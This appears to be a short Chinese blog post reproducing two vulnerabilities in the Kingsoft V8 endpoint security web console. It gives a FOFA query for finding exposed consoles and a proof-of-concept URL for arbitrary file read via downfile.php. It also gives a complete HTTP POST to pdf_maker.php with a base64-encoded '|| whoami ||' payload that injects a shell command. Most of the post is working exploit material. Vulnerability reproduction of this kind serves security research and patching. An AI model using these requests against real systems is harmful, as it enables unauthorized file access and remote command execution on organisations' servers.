---
title: Kingsoft-K8-vulnerability
tags:
  - vuln
categories:
  - 漏洞复现
copyright: true
abbrlink: 6b98c3b0
date: 2021-07-12 23:52:57
---

![](https://z3.ax1x.com/2021/07/13/WFHmrV.jpg)
<!--more-->

### 金山 V8 終端安全系统任意文件读取漏洞

FOFA

`title="在线安装-V8+终端安全系统Web控制台"`

POC

```
http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php
```

![img](https://z3.ax1x.com/2021/07/13/WFHozn.png)

### 金山V8 终端安全系统命令执行漏洞

​	原文：https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA

![img](https://z3.ax1x.com/2021/07/13/WFH7Mq.png)

漏洞位置：

`http://xxx.xxx.xxx.xxx//inter/pdf_maker.php`

FOFA

`title="在线安装-V8+终端安全系统Web控制台"`

验证

http://x.x.x.x/inter/pdf_maker.php

url值为经过base64编码后的 `"|| whoami ||`

![img](https://z3.ax1x.com/2021/07/13/WFH5Gj.png)

请求包如下：

```sqlite
POST /inter/pdf_maker.php HTTP/1.1
Host: x.x.x.x.x
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0; en_US) Gecko/20100101 Firefox/87.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=ic3v6dkhmff0ljn7pgusad43s0
X-Forwarded-For: 110.110.110.110
X-Originating-IP: 110.110.110.110
X-Remote-IP: 110.110.110.110
X-Remote-Addr: 110.110.110.110
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

url=Inx8IHdob2FtaSB8fA==&fileName=xxx
```

看看连接情况：

![img](https://z3.ax1x.com/2021/07/13/WFHIRs.png)

**Reference**

https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA

https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20pdf_maker.php%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

